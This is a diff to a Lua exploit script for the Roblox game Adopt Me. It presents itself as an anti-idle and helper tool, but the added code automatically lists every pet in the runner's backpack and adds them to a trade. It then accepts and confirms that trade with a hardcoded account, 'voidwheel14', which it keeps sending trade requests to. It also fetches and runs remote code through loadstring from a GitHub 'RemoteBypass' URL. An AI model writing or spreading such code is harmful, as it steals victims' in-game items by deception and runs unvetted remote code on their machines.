@@ -37,6 +37,55 @@ game:service'Players'.LocalPlayer.Idled:connect(function()
 bb:CaptureController()bb:ClickButton2(Vector2.new())
 ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)
 
+local function clickin()
+while true do
+if game.Players.LocalPlayer.PlayerGui then
+    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("NewsApp") then
+        if game.Players.LocalPlayer.PlayerGui.NewsApp:FindFirstChild("EnclosingFrame") then
+            if game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame:FindFirstChild("MainFrame") then
+                if game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame:FindFirstChild("Contents") then
+                    if game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents:FindFirstChild("PlayButton") then
+                        game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.Size = UDim2.new(10, 100, -100, 100)
+                    end
+                end
+            end
+        end
+    end
+end
+
+if game.Players.LocalPlayer.PlayerGui then
+    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("ToolApp") then
+        if game.Players.LocalPlayer.PlayerGui.ToolApp:FindFirstChild("Frame") then
+            if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame:FindFirstChild("Hotbar") then
+                if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar:FindFirstChild("OpenBackpackContainer") then
+                    if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar.OpenBackpackContainer:FindFirstChild("OpenBackpack") then
+                        if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar.OpenBackpackContainer.OpenBackpack:FindFirstChild("UIScale") then
+                            game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar.OpenBackpackContainer.OpenBackpack.UIScale.Scale = 100
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+
+local VirtualInputManager = game:GetService('VirtualInputManager')
+
+local screenWidth = game.Workspace.CurrentCamera.ViewportSize.X
+local screenHeight = game.Workspace.CurrentCamera.ViewportSize.Y
+
+local centerX = screenWidth / 2
+local centerY = screenHeight / 2
+
+VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
+VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
+
+wait(1)
+end
+end
+spawn(clickin)
+
 local function remotescript()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
 end
@@ -146,6 +195,53 @@ wait(1)
 end
 end
 spawn(redeem)
+
+
+local processedFrames = {}
+local function PetData()
+while true do
+    if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("BackpackApp") then
+        local backpackApp = game:GetService("Players").LocalPlayer.PlayerGui.BackpackApp
+        if backpackApp:FindFirstChild("Frame") then
+            local frame = backpackApp.Frame
+            if frame:FindFirstChild("Body") then
+                local body = frame.Body
+                if body:FindFirstChild("ScrollComplex") then
+                    local scrollComplex = body.ScrollComplex
+                    if scrollComplex:FindFirstChild("ScrollingFrame") then
+                        local scrollingFrame = scrollComplex.ScrollingFrame
+                        if scrollingFrame:FindFirstChild("Content") then
+                            local content = scrollingFrame.Content
+                            if content:FindFirstChild("pets") then
+                                local pets = content.pets
+
+                                for _, child in pairs(pets:GetChildren()) do
+                                    if child.Name:lower():find("row") and child.Name ~= "add_more_pets" then
+                                        for _, frameChild in pairs(child:GetChildren()) do
+                                            if frameChild:IsA("Frame") then
+                                                local frameName = frameChild.Name
+                                                if not processedFrames[frameName] then
+                                                    print(frameName)
+                                                    processedFrames[frameName] = true
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    wait(1)
+end
+wait()
+end
+spawn(PetData)
+
+
 local function tradeplayer()
 while true do
 local playerName = "simpleblandok3"
@@ -153,7 +249,7 @@ local player = game:GetService("Players"):FindFirstChild(playerName)
 
 if player then
 local args = {
-    [1] = game:GetService("Players").simpleblandok3
+    [1] = game:GetService("Players").voidwheel14
 }
 
 game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
@@ -163,6 +259,41 @@ end
 wait(10)
 end
 end
+
+local function TradePets()
+    while true do
+        if game.Players.LocalPlayer.PlayerGui then
+            local playerGui = game.Players.LocalPlayer.PlayerGui
+            if playerGui:FindFirstChild("TradeApp") then
+                local tradeApp = playerGui.TradeApp
+                if tradeApp:FindFirstChild("Frame") then
+                    local frame = tradeApp.Frame
+                    if frame.Visible == true then
+                        while next(processedFrames) do
+                            local frameName = next(processedFrames)
+                            local args = {
+                                [1] = frameName
+                            }
+                            game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
+                            processedFrames[frameName] = nil
+                           
+                        end
+wait(3)
+game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
+wait(10)
+game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
+                        break
+                    end
+                end
+            end
+        end
+        wait(1)
+    end
+end
+
+spawn(TradePets)
+spawn(tradeplayer)
+
 
 local SwitchOne = false
 local waitcooldown = false
